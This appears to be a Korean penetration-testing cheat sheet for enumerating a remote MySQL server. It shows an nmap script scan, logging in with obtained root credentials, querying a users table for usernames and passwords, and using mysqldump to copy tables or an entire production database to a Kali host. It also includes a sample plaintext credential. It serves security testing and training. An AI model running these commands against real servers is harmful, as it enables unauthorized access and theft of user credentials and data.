- nmap mysql 스크립트와 mysql·mysqldump 클라이언트로 원격 MySQL 서버를 열거하고, 데이터베이스와 테이블 전체를 파일로 덤프하는 절차
- 3306·33060 같은 DB 포트를 발견하고 root 등 계정 크리덴셜을 손에 넣었을 때 users 테이블의 username·password 컬럼을 바로 확인한다
- 타깃의 DB 포트(예: 3306, 33060) 접근 가능, nmap·mysql·mysqldump 설치, 유효한 계정 크리덴셜 필요

nmap -p <포트> -Pn -n --open -sV --script="mysql\*" <아이피>
mysql -u <유저> -p -h <아이피/호스트이름> -P <포트>
mysql -u root -p -h 172.31.1.1 -P 33060

# 데이터베이스 확인

show databases;

## 데이터베이스 사용

use <데이터베이스>;

## 테이블 확인

show tables;

## 테이블 내 모든 열 & 행 확인

select \* from <테이블>;

## 특정 열(column) 내 특정 문자열 확인

select \* from <테이블> where lower(<열>) like '%<문자열>%';

## 예) 유저 이름 열 중 Garcia가 포함된 행의 username, password 반환

MySQL [production]> select username,password from users where lower(username) like '%garcia%';
+-------------+------------+
| username | password |
+-------------+------------+
| garcia.liam | LiamG#2023 |
+-------------+------------+

## 특정 데이터베이스 내 특정 테이블 덤프

mysqldump -h <아이피/dns> -u <유저> -p -P <포트> <DB이름> <테이블이름> > <파일이름>
mysqldump -h 172.31.198.21 -u root -p -P 33060 production users > usertabledump.sql

## 특정 데이터베이스 전체 덤프

mysqldump -h <아이피/dns> -u <유저> -p -P <포트> <DB이름> > <파일이름>
mysqldump -h 172.31.198.21 -u root -p -P 33060 production > productiondbdump.sql

## 예

┌──(root㉿kali)-[~/groot]  
└─# mysqldump -h 172.31.198.21 -u root -p -P 33060 production users > usertabledump.sql
Enter password:

┌──(root㉿kali)-[~/groot]  
└─# cat usertabledump.sql
